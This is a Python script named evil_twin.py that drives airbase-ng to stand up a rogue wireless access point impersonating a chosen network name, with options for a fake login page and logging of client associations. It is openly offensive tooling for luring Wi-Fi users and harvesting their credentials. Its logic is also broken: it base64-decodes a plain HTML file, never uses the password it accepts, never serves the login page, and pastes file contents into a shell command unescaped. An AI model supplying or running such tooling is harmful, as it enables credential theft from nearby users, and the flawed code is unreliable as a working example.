import subprocess
import sys

def usage():
    print("\n\tOptions:")
    print("\n\t\t-h : Display this help message")
    print("\n\t\t-s : Start Evil Twin attack")
    print("\n\t\t-p : Specify the password for the attack (optional)")
    print("\n\t\t-e : Specify the ESSID for the attack (optional)")
    print("\n\t\t-l : Specify the HTML login page for the attack (optional)")
    print("\n\tExamples:")
    print("\n\t\tpython evil_twin.py -s -e mynetwork -p mypassword -l login.html")
    print("\n\t\tpython evil_twin.py -s -e mynetwork -l login.html")
    print("\n\tNote: You may need to run this script with sudo depending on your permissions.")
    print("\n\tNote: Before using this script, ensure your wireless interface is in monitor mode using 'airmon-ng start wlan0' (wlan0 is the interface name).\n")

def evil_twin_attack(essid, password, login_page):
    if not essid:
        print("\n\tPlease provide a ESSID for the attack.\n")
        return

    if login_page:
        with open(login_page, 'r') as f:
            login_page_content = f.read()

        command = f"echo '{login_page_content}' | base64 -d > /tmp/login.html && airbase-ng -P -e '{essid}' -a 00:11:22:33:44:55 -v wlan0 | tee evil_twin.log | grep -a -A 20 'Received Association Response' | tail -n 1"
    elif password:
        command = f"airbase-ng -P -e '{essid}' -a 00:11:22:33:44:55 -v wlan0 | tee evil_twin.log | grep -a -A 20 'Received Association Response' | tail -n 1"
    else:
        command = f"airbase-ng -e '{essid}' -a 00:11:22:33:44:55 -v wlan0 | tee evil_twin.log | grep -a -A 20 'Received Association Response' | tail -n 1"

    try:
        subprocess.check_output(command, shell=True)
    except subprocess.CalledProcessError as e:
        print("\n\tAn error occurred while setting up the Evil Twin attack. Please check your ESSID and password.\n")
        return

    print("\n\tEvil Twin attack has been started. Look for the output in the 'evil_twin.log' file.\n")

def main():
    essid = ""
    password = ""
    login_page = ""

    if len(sys.argv) == 1:
        usage()
        return

    for i in range(1, len(sys.argv)):
        if sys.argv[i] == "-h":
            usage()
            return
        elif sys.argv[i] == "-s":
            continue
        elif sys.argv[i] == "-e":
            essid = sys.argv[i + 1]
        elif sys.argv[i] == "-p":
            password = sys.argv[i + 1]
        elif sys.argv[i] == "-l":
            login_page = sys.argv[i + 1]

    evil_twin_attack(essid, password, login_page)

if __name__ == "__main__":
    main()
